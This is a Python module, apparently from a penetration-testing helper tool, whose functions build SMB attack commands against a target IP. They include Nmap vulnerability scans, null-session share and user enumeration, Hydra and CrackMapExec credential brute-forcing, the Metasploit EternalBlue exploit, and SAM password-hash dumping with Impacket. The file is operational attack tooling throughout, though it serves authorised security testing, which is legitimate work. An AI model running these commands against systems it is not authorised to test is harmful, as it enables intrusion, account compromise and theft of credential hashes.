from Modules.Imports.protocol_imports import *

def run_nmap_smb_scripts(target_ip, open_ports):
    title = "Nmap SMB Scripts"
    content = (
        f"nmap -p 445 --script=smb-vuln* {target_ip}\n"
        f"nmap --script=smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-shares.nse,"
        f"smb-enum-users.nse,smb-os-discovery.nse {target_ip}"
    )
    run_command(title, content, target_ip, open_ports)

def list_smb_shares(target_ip, open_ports):
    title = "List SMB Shares"
    content = f"smbclient -L \\\\{target_ip}\\ -U ''"
    run_command(title, content, target_ip, open_ports)

def run_enum4linux(target_ip, open_ports):
    title = "enum4linux"
    content = f"enum4linux -a {target_ip}"
    run_command(title, content, target_ip, open_ports)

def run_rpcclient_commands(target_ip, open_ports):
    title = "rpcclient Commands"
    content = (
        f"rpcclient -U '' -N {target_ip}\n"
        f"lookupnames Administrator\n"
        f"lookupsids S-1-5-32-544"
    )
    run_command(title, content, target_ip, open_ports)

def brute_force_smb_hydra(target_ip, open_ports):
    title = "Hydra SMB Brute-Force"
    content = f"hydra -L usernames.txt -P passwords.txt -vV {target_ip} smb"
    run_command(title, content, target_ip, open_ports)

def run_crackmapexec_smb(target_ip, open_ports):
    title = "CrackMapExec SMB"
    content = f"crackmapexec smb {target_ip} -u USERNAME -p PASSWORD"
    run_command(title, content, target_ip, open_ports)

def exploit_smb_metasploit(target_ip, open_ports):
    title = "Exploit SMB with Metasploit"
    content = (
        f"use exploit/windows/smb/ms17_010_eternalblue\n"
        f"set RHOSTS {target_ip}\n"
        f"run"
    )
    run_command(title, content, target_ip, open_ports)

def dump_sam_hashes(target_ip, open_ports):
    title = "Dump SAM Hashes"
    content = f"python3 /usr/share/doc/python-impacket-doc/examples/samrdump.py {target_ip}"
    run_command(title, content, target_ip, open_ports)

def show_hacktricks_reference(target_ip, open_ports):
    title = "HackTricks Reference"
    content = (
        f"Visit the following link for more RPC/SMB enumeration tips:\n\n"
        f"https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb"
    )
    run_command(title, content, target_ip, open_ports)
